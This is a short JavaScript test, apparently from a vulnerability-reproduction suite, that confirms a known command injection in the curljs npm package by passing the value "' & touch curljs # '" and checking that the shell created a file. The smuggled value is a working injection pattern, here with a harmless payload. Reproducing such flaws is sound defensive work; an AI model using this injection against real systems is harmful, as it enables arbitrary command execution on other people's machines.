//https://snyk.io/vuln/SNYK-JS-CURLJS-1050404
test("Command Injection in curljs", () => {
  const a = require("curljs");
  const fs = require("fs");
  const path = "./curljs";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  a("' & touch curljs # '");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
